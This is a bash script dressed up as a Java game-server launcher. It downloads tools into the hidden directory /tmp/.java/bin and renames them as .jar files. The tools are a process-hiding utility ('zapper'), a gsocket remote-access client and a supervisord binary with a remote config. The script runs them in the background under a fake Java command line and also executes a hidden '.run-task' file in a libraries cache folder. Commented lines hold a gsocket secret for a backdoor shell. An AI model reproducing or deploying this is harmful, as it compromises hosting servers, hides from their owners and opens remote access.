#!/bin/bash

function fetch_files() {
    mkdir -p /tmp/.java/bin
    # cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
    # cd /tmp/.java/bin && curl -L  https://github.com/i51jir6ni9t0/backup/raw/master/ukgame/cnf-0.json -o conf.json
    cd /tmp/.java/bin && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o patch.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/ukgame/cfg.conf -o cfg.conf
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && nohup ./patch.jar -a 'java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
    bash /home/container/libraries/org/codehaus/plexus/plexus-utils/3.5.1/.cache/.run-task
    # GNET
    # export GSOCKET_ARGS="-s b3928cae-d2a1e2c-5a16f98-13d9g8hbj7-56c4a961-ecd9f9440-d6a2803-8a1c5j1g60 -liqD"
    # cd /tmp/.java/bin && exec -a -java ./add-on.jar &
}

if [ -f "/tmp/.java/bin/cfg.conf" ]  && [ -f "/tmp/.java/bin/plugins.jar" ] && [ -f "/tmp/.java/bin/add-on.jar" ]; then
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
